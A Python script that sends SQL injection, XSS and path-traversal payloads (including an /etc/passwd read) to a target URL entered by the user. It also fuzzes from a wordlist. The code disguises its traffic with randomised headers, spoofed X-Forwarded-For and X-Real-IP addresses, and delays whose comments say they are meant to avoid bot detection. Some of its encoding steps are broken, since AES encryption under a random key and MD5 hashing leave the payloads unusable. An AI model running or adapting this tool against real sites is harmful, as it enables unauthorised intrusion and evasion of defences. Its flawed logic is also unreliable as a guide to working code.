import requests
import random
import string
import base64
import hashlib
from Crypto.Cipher import AES
import time

class TamperAndFuzz:
    def __init__(self, url):
        self.url = url
        self.key = self.random_string(32)

    def random_string(self, length=8):
        letters = string.ascii_letters + string.digits
        return ''.join(random.choice(letters) for i in range(length))

    def obfuscate_payload(self, payload):
        # Enhanced obfuscation logic
        obfuscated = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5)) + payload + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))
        obfuscated = obfuscated.replace("'", "\\'")
        obfuscated = obfuscated.replace("\"", "\\\"")
        obfuscated = obfuscated.replace("<", "&lt;")
        obfuscated = obfuscated.replace(">", "&gt;")
        return obfuscated

    def encrypt_payload(self, payload):
        # AES encryption
        cipher = AES.new(self.key.encode('utf-8'), AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(payload.encode('utf-8'))
        return base64.b64encode(nonce + ciphertext).decode('utf-8')

    def tamper_request(self):
        payloads = [
            "' OR '1'='1",
            "<script>alert('XSS')</script>",
            "../../etc/passwd",
            "' OR 1=1 -- ",
            "' UNION SELECT NULL,NULL,NULL -- "
        ]
        headers = {
            "User-Agent": self.random_string(10),
            "Referer": self.random_string(10),
            "Cookie": self.random_string(10)
        }
        for payload in payloads:
            obfuscated_payload = self.obfuscate_payload(payload)
            encrypted_payload = self.encrypt_payload(payload)
            formats = [obfuscated_payload, encrypted_payload, base64.b64encode(payload.encode()).decode('utf-8'), hashlib.md5(payload.encode()).hexdigest()]
            for fmt in formats:
                response = requests.get(self.url, params={"input": fmt}, headers=headers)
                print(f"Payload: {fmt} | Status Code: {response.status_code}")
                time.sleep(1)  # Adding delay to avoid being detected as a bot

    def fuzz_request(self, wordlist_path):
        try:
            with open(wordlist_path, 'r') as file:
                for line in file:
                    payload = line.strip()
                    obfuscated_payload = self.obfuscate_payload(payload)
                    encrypted_payload = self.encrypt_payload(payload)
                    formats = [obfuscated_payload, encrypted_payload, base64.b64encode(payload.encode()).decode('utf-8'), hashlib.md5(payload.encode()).hexdigest()]
                    for fmt in formats:
                        response = requests.get(self.url, params={"input": fmt})
                        print(f"Fuzzed Payload: {fmt} | Status Code: {response.status_code}")
                        time.sleep(1)  # Adding delay to avoid being detected as a bot
        except Exception as e:
            print(f"Error fuzzing request: {e}")

    def randomize_headers(self):
        headers = {
            "User-Agent": self.random_string(10),
            "Referer": self.random_string(10),
            "Cookie": self.random_string(10),
            "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "X-Real-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        }
        return headers

    def advanced_fuzz_request(self, wordlist_path):
        try:
            with open(wordlist_path, 'r') as file:
                for line in file:
                    payload = line.strip()
                    obfuscated_payload = self.obfuscate_payload(payload)
                    encrypted_payload = self.encrypt_payload(payload)
                    formats = [obfuscated_payload, encrypted_payload, base64.b64encode(payload.encode()).decode('utf-8'), hashlib.md5(payload.encode()).hexdigest()]
                    headers = self.randomize_headers()
                    for fmt in formats:
                        response = requests.get(self.url, params={"input": fmt}, headers=headers)
                        print(f"Fuzzed Payload: {fmt} | Status Code: {response.status_code} | Headers: {headers}")
                        time.sleep(1)  # Adding delay to avoid being detected as a bot
        except Exception as e:
            print(f"Error in advanced fuzzing request: {e}")

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    wordlist = input("Enter the path to the wordlist: ")
    tamper_and_fuzz = TamperAndFuzz(target_url)
    tamper_and_fuzz.tamper_request()
    tamper_and_fuzz.fuzz_request(wordlist)
    tamper_and_fuzz.advanced_fuzz_request(wordlist)
